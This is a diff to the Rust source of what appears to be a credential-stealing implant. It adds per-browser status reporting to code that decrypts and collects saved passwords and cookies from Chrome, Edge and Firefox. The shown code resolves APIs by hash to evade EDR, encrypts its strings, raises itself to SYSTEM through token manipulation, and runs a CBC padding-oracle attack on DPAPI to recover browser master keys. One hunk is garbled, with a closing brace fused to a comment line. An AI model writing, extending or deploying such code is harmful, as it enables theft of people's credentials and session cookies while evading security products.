@@ -24,9 +24,9 @@ use anyhow::{anyhow, bail, Context, Result};
 use base64::Engine as _;
 use serde::{Deserialize, Serialize};
 
-use winapi::shared::guiddef::GUID;
-use winapi::shared::minwindef::{DWORD, HMODULE};
-use winapi::um::winnt::HANDLE;
+use crate::win_types::GUID;
+use crate::win_types::{DWORD, HMODULE};
+use crate::win_types::HANDLE;
 
 // ── Dynamic API resolution — no IAT entries ──────────────────────────────────
 //
@@ -35,13 +35,13 @@ use winapi::um::winnt::HANDLE;
 // EDR products scan for.
 
 type FnCryptUnprotectData = unsafe extern "system" fn(
-    *mut winapi::um::wincrypt::CRYPT_INTEGER_BLOB,
+    *mut windows_sys::Win32::Security::Cryptography::CRYPT_INTEGER_BLOB,
     *mut *mut u16,
-    *mut winapi::um::wincrypt::CRYPT_INTEGER_BLOB,
+    *mut windows_sys::Win32::Security::Cryptography::CRYPT_INTEGER_BLOB,
     *mut c_void,
     *mut c_void,
     u32,
-    *mut winapi::um::wincrypt::CRYPT_INTEGER_BLOB,
+    *mut windows_sys::Win32::Security::Cryptography::CRYPT_INTEGER_BLOB,
 ) -> i32;
 
 type FnCoCreateInstance = unsafe extern "system" fn(
@@ -264,11 +264,39 @@ pub struct CookieRecord {
     pub samesite: i32,
 }
 
+/// Status of a single browser's data collection.
+#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
+#[serde(rename_all = "snake_case")]
+pub enum BrowserCollectionStatus {
+    /// Browser data directory not found (browser likely not installed).
+    NotInstalled,
+    /// Master key derivation failed (App-Bound Encryption or DPAPI error).
+    KeyDerivationFailed,
+    /// NSS library loading or initialization failed (Firefox only).
+    NssInitFailed,
+    /// Collection succeeded; check credentials/cookies for results.
+    Success,
+}
+
+/// Per-browser status entry.
+#[derive(Debug, Clone, Serialize, Deserialize)]
+pub struct BrowserStatus {
+    /// Which browser this status refers to.
+    pub browser: String,
+    /// Collection outcome.
+    pub status: BrowserCollectionStatus,
+    /// Optional human-readable detail (e.g. error message).
+    pub detail: Option<String>,
+}
+
 /// Aggregated result returned by [`collect_browser_data`].
 #[derive(Debug, Default, Serialize, Deserialize)]
 pub struct BrowserDataResult {
     pub credentials: Vec<CredentialRecord>,
     pub cookies: Vec<CookieRecord>,
+    /// Per-browser collection status — allows callers to distinguish
+    /// "not installed" from "installed but empty" from "key error".
+    pub statuses: Vec<BrowserStatus>,
 }
 
 // ── SQLite minimal parser ──────────────────────────────────────────────────────
@@ -651,7 +679,7 @@ fn sqlite_read_table(db: &[u8], table_name: &str) -> Result<Vec<Vec<SqliteValue>
 /// Callers needing SYSTEM-context decryption should first call
 /// `token_manipulation::get_system()` and revert after.
 fn dpapi_decrypt(data: &[u8]) -> Result<Vec<u8>> {
-    use winapi::um::wincrypt::CRYPT_INTEGER_BLOB;
+    use windows_sys::Win32::Security::Cryptography::CRYPT_INTEGER_BLOB;
 
     let crypt_unprotect = unsafe { resolve_crypt_unprotect_data() }
         .ok_or_else(|| anyhow!("CryptUnprotectData resolve failed"))?;
@@ -1151,17 +1179,17 @@ fn get_chromium_master_key(local_state_path: &Path, clsids: &[GUID]) -> Result<V
     if let Some(timeout_secs) = c4_oracle_timeout() {
         match decrypt_master_key_via_c4(&encrypted_key, timeout_secs) {
             Ok(key) if key.len() == 32 => {
-                log::info!("C4 padding oracle recovered AES-256 key (32 bytes)");
+                tracing::info!("C4 padding oracle recovered AES-256 key (32 bytes)");
                 return Ok(key);
             }
             Ok(key) => {
-                log::warn!(
+                tracing::warn!(
                     "C4 recovered key of unexpected length {} (expected 32), falling back",
                     key.len()
                 );
             }
             Err(e) => {
-                log::warn!("C4 padding oracle failed: {e:#}, falling back to elevated strategies");
+                tracing::warn!("C4 padding oracle failed: {e:#}, falling back to elevated strategies");
             }
         }
     }
@@ -1265,13 +1293,13 @@ pub fn set_c4_timeout(secs: u64) {
 /// Returns the function pointer on success.
 unsafe fn resolve_crypt_unprotect_data() -> Option<
     unsafe extern "system" fn(
-        *mut winapi::um::wincrypt::CRYPT_INTEGER_BLOB, // pDataIn
+        *mut windows_sys::Win32::Security::Cryptography::CRYPT_INTEGER_BLOB, // pDataIn
         *mut *mut u16,                                 // ppszDataDescr
-        *mut winapi::um::wincrypt::CRYPT_INTEGER_BLOB, // pOptionalEntropy
+        *mut windows_sys::Win32::Security::Cryptography::CRYPT_INTEGER_BLOB, // pOptionalEntropy
         *mut c_void,                                   // pvReserved
         *mut c_void,                                   // pPromptStruct
         u32,                                           // dwFlags
-        *mut winapi::um::wincrypt::CRYPT_INTEGER_BLOB, // pDataOut
+        *mut windows_sys::Win32::Security::Cryptography::CRYPT_INTEGER_BLOB, // pDataOut
     ) -> i32,
 > {
     let dll_base = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_CRYPT32_DLL)?;
@@ -1284,17 +1312,17 @@ unsafe fn resolve_crypt_unprotect_data() -> Option<
 /// and return whether padding was valid (true = valid).
 unsafe fn dpapi_oracle(
     crypt_unprotect: unsafe extern "system" fn(
-        *mut winapi::um::wincrypt::CRYPT_INTEGER_BLOB,
+        *mut windows_sys::Win32::Security::Cryptography::CRYPT_INTEGER_BLOB,
         *mut *mut u16,
-        *mut winapi::um::wincrypt::CRYPT_INTEGER_BLOB,
+        *mut windows_sys::Win32::Security::Cryptography::CRYPT_INTEGER_BLOB,
         *mut c_void,
         *mut c_void,
         u32,
-        *mut winapi::um::wincrypt::CRYPT_INTEGER_BLOB,
+        *mut windows_sys::Win32::Security::Cryptography::CRYPT_INTEGER_BLOB,
     ) -> i32,
     blob: &[u8],
 ) -> bool {
-    use winapi::um::wincrypt::CRYPT_INTEGER_BLOB;
+    use windows_sys::Win32::Security::Cryptography::CRYPT_INTEGER_BLOB;
 
     let mut in_blob = CRYPT_INTEGER_BLOB {
         cbData: blob.len() as u32,
@@ -1448,7 +1476,7 @@ fn parse_dpapi_blob(blob: &[u8]) -> Result<DpapiBlobInfo> {
     // However, the oracle reveals *all* the plaintext of the encrypted
     // section, not just the key.  We attack the entire ciphertext to be safe.
 
-    log::debug!(
+    tracing::debug!(
         "DPAPI blob parsed: encrypted block at offset {}, length {} bytes ({} AES blocks)",
         enc_offset,
         enc_len,
@@ -1467,13 +1495,13 @@ fn parse_dpapi_blob(blob: &[u8]) -> Result<DpapiBlobInfo> {
 /// Returns the decrypted plaintext bytes of the encrypted section.
 fn cbc_padding_oracle(
     crypt_unprotect: unsafe extern "system" fn(
-        *mut winapi::um::wincrypt::CRYPT_INTEGER_BLOB,
+        *mut windows_sys::Win32::Security::Cryptography::CRYPT_INTEGER_BLOB,
         *mut *mut u16,
-        *mut winapi::um::wincrypt::CRYPT_INTEGER_BLOB,
+        *mut windows_sys::Win32::Security::Cryptography::CRYPT_INTEGER_BLOB,
         *mut c_void,
         *mut c_void,
         u32,
-        *mut winapi::um::wincrypt::CRYPT_INTEGER_BLOB,
+        *mut windows_sys::Win32::Security::Cryptography::CRYPT_INTEGER_BLOB,
     ) -> i32,
     blob: &[u8],
     enc_offset: usize,
@@ -1638,7 +1666,7 @@ fn cbc_padding_oracle(
                 intermediate[block_idx * block_size + k] ^ blob[enc_offset + prev_block_start + k];
         }
 
-        log::debug!(
+        tracing::debug!(
             "C4: recovered block {}/{} ({} oracle calls, {:.1}s elapsed)",
             block_idx,
             num_blocks - 1,
@@ -1660,7 +1688,7 @@ fn cbc_padding_oracle(
         }
     }
 
-    log::info!(
+    tracing::info!(
         "C4 padding oracle completed: {} oracle calls, {:.1}s, recovered {} bytes",
         oracle_calls,
         start.elapsed().as_secs_f64(),
@@ -1680,7 +1708,7 @@ fn decrypt_master_key_via_c4(encrypted_key: &[u8], timeout_secs: u64) -> Result<
     let mut lock = C4_LOCK.blocking_lock();
     if let Some(ref existing) = *lock {
         existing.cancel();
-        log::warn!(
+        tracing::warn!(
             "{}",
             String::from_utf8_lossy(&string_crypt::enc_str!(
                 "C4: cancelling in-progress attack for new request"
@@ -1733,7 +1761,7 @@ fn decrypt_master_key_via_c4(encrypted_key: &[u8], timeout_secs: u64) -> Result<
     // prepends metadata).
     if plaintext.len() >= 32 {
         let key = plaintext[plaintext.len() - 32..].to_vec();
-        log::debug!(
+        tracing::debug!(
             "C4: extracted last 32 bytes as key from {}-byte plaintext",
             plaintext.len()
         );
@@ -1945,18 +1973,37 @@ pub fn collect_chrome_data(data_type: &common::BrowserDataType) -> BrowserDataRe
     let mut result = BrowserDataResult::default();
     let lad = match local_app_data() {
         Some(p) => p,
-        None => return result,
+        None => {
+            result.statuses.push(BrowserStatus {
+                browser: "Chrome".to_string(),
+                status: BrowserCollectionStatus::NotInstalled,
+                detail: Some("LOCALAPPDATA env var not set".to_string()),
+            });
+            return result;
+        }
     };
 
     let user_data_dir = lad.join("Google").join("Chrome").join("User Data");
     if !user_data_dir.is_dir() {
+        result.statuses.push(BrowserStatus {
+            browser: "Chrome".to_string(),
+            status: BrowserCollectionStatus::NotInstalled,
+            detail: None,
+        });
         return result;
     }
 
     let local_state = user_data_dir.join("Local State");
     let master_key = match get_chromium_master_key(&local_state, CHROME_ELEVATION_CLSIDS) {
         Ok(k) => common::SecureKey::from_vec(k),
-        Err(_) => return result,
+        Err(e) => {
+            result.statuses.push(BrowserStatus {
+                browser: "Chrome".to_string(),
+                status: BrowserCollectionStatus::KeyDerivationFailed,
+                detail: Some(format!("{}", e)),
+            });
+            return result;
+        }
     };
 
     for profile in find_chromium_profiles(&user_data_dir) {
@@ -1979,6 +2026,11 @@ pub fn collect_chrome_data(data_type: &common::BrowserDataType) -> BrowserDataRe
                 .extend(collect_chromium_cookies(&profile, &master_key, "Chrome"));
         }
     }
+    result.statuses.push(BrowserStatus {
+        browser: "Chrome".to_string(),
+        status: BrowserCollectionStatus::Success,
+        detail: None,
+    });
     result
 }
 
@@ -1987,18 +2039,37 @@ pub fn collect_edge_data(data_type: &common::BrowserDataType) -> BrowserDataResu
     let mut result = BrowserDataResult::default();
     let lad = match local_app_data() {
         Some(p) => p,
-        None => return result,
+        None => {
+            result.statuses.push(BrowserStatus {
+                browser: "Edge".to_string(),
+                status: BrowserCollectionStatus::NotInstalled,
+                detail: Some("LOCALAPPDATA env var not set".to_string()),
+            });
+            return result;
+        }
     };
 
     let user_data_dir = lad.join("Microsoft").join("Edge").join("User Data");
     if !user_data_dir.is_dir() {
+        result.statuses.push(BrowserStatus {
+            browser: "Edge".to_string(),
+            status: BrowserCollectionStatus::NotInstalled,
+            detail: None,
+        });
         return result;
     }
 
     let local_state = user_data_dir.join("Local State");
     let master_key = match get_chromium_master_key(&local_state, EDGE_ELEVATION_CLSIDS) {
         Ok(k) => common::SecureKey::from_vec(k),
-        Err(_) => return result,
+        Err(e) => {
+            result.statuses.push(BrowserStatus {
+                browser: "Edge".to_string(),
+                status: BrowserCollectionStatus::KeyDerivationFailed,
+                detail: Some(format!("{}", e)),
+            });
+            return result;
+        }
     };
 
     for profile in find_chromium_profiles(&user_data_dir) {
@@ -2019,6 +2090,11 @@ pub fn collect_edge_data(data_type: &common::BrowserDataType) -> BrowserDataResu
                 .extend(collect_chromium_cookies(&profile, &master_key, "Edge"));
         }
     }
+    result.statuses.push(BrowserStatus {
+        browser: "Edge".to_string(),
+        status: BrowserCollectionStatus::Success,
+        detail: None,
+    });
     result
 }
 
@@ -2394,12 +2470,26 @@ pub fn collect_firefox_data(data_type: &common::BrowserDataType) -> BrowserDataR
 
     let install_dir = match find_firefox_install_dir() {
         Some(d) => d,
-        None => return result,
+        None => {
+            result.statuses.push(BrowserStatus {
+                browser: "Firefox".to_string(),
+                status: BrowserCollectionStatus::NotInstalled,
+                detail: None,
+            });
+            return result;
+        }
     };
 
     let (h_mozglue, h_nss3, fns) = match unsafe { load_nss(&install_dir) } {
         Ok(t) => t,
-        Err(_) => return result,
+        Err(e) => {
+            result.statuses.push(BrowserStatus {
+                browser: "Firefox".to_string(),
+                status: BrowserCollectionStatus::NssInitFailed,
+                detail: Some(format!("{}", e)),
+            });
+            return result;
+        }
     };
 
     for profile_dir in find_firefox_profiles() {
@@ -2461,10 +2551,14 @@ pub fn collect_firefox_data(data_type: &common::BrowserDataType) -> BrowserDataR
         }
     }
 
-    result
-}
+    result.statuses.push(BrowserStatus {
+        browser: "Firefox".to_string(),
+        status: BrowserCollectionStatus::Success,
+        detail: None,
+    });
 
-// ── Top-level dispatch ─────────────────────────────────────────────────────────
+    result
+} ─────────────────────────────────────────────────────────
 
 /// Collect stored browser data according to `browser` and `data_type`.
 /// Returns a JSON-serialized [`BrowserDataResult`].
@@ -2483,12 +2577,14 @@ pub fn collect_browser_data(
         let partial = collect_chrome_data(&data_type);
         result.credentials.extend(partial.credentials);
         result.cookies.extend(partial.cookies);
+        result.statuses.extend(partial.statuses);
     }
 
     if matches!(target, common::BrowserType::Edge | common::BrowserType::All) {
         let partial = collect_edge_data(&data_type);
         result.credentials.extend(partial.credentials);
         result.cookies.extend(partial.cookies);
+        result.statuses.extend(partial.statuses);
     }
 
     if matches!(
@@ -2498,6 +2594,7 @@ pub fn collect_browser_data(
         let partial = collect_firefox_data(&data_type);
         result.credentials.extend(partial.credentials);
         result.cookies.extend(partial.cookies);
+        result.statuses.extend(partial.statuses);
     }
 
     let json = serde_json::to_string(&result).context("serializing BrowserDataResult")?;
@@ -2671,7 +2768,7 @@ mod tests {
 
     #[test]
     fn decrypt_chromium_value_too_short_errors() {
-        let key = [0u8; 32];
+        let key = common::SecureKey::from_vec(vec![0u8; 32]);
         let result = decrypt_chromium_value(&key, b"v10");
         assert!(result.is_err());
     }
